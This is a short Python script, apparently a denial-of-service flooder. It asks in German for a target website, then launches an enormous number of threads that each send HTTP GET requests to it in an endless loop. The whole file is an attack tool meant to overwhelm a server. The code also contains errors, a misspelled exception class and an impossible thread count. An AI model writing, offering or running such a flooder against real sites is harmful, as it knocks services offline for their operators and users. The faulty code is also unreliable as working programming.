import requests
import threading
import time

NUM_THREADS = 999999999999999999999999999999999999999999999999999999

URL = input("Gib deine Website ein: ")
 
TARGET_URL = URL

def bombard_server():
    while True:
      try:
         response = requests.get(TARGET_URL)
         print(f"Status Code: {response.status_code}")
      except requests.exceptions.RequestsRxception as e:
         print(f"Requests failed: {e}")

threads = []
for _ in range(NUM_THREADS):
    thread = threading.Thread(target=bombard_server)
    thread.daemon = True
    threads.append(thread)
    thread.start()

while True:
    time.sleep(0.001)
